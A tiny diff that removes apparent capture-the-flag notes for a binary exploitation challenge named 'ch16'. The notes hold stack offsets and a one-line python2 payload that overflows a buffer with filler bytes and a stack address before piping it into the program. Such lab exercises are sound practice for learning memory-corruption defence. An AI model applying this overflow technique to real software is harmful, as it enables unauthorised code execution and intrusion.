@@ -1,5 +1,0 @@
-check = ebp-0x50
-
-buffer = ebp-0x4c
-
-cat <(python2 -c "print '\x08' * 4 + '\xbc\xfa\xff\xbf'") - | ./ch16
